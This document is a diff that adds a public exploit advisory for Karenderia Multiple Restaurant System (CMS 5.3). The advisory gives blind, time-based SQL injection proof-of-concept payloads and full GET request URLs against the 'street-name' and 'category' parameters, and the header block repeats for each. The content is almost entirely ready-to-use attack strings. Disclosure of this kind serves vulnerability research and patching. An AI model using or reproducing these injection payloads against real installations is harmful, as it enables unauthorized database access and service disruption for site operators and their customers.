@@ -1,0 +1,46 @@
+===========================================================================================
+# Exploit Title: Karenderia CMS 5.3 - Multiple SQL Vuln.
+# Dork: N/A
+# Date: 05-07-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: buyer2@codemywebapps.com
+# Software Link: https://codecanyon.net/item/karenderia-multiple-restaurant-system/9118694
+# Version: v5.3
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: Karenderia Multiple Restaurant System is a
+restaurant food ordering and restaurant membership system.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : street-name
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+
+# GET Method :
+http://localhost/kmrs/searcharea?st=Los%20Angeles,%20CA,%20United%20States&street-name=1%20+%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))/*'XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR'|
+"XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR"*/
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: Karenderia CMS 5.3 - Multiple SQL Vuln.
+# Dork: N/A
+# Date: 05-07-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: buyer2@codemywebapps.com
+# Software Link: https://codecanyon.net/item/karenderia-multiple-restaurant-system/9118694
+# Version: v5.3
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: Karenderia Multiple Restaurant System is a
+restaurant food ordering and restaurant membership system.
+===========================================================================================
+# POC - SQLi (Blind)
+# Parameters : category
+# Attack Pattern :
+1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
+# GET Method :
+http://localhost/kmrs/store/cuisine/?category=1%20+%20((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))/*'XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR'|
+"XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)))OR"*/&page=2
+===========================================================================================
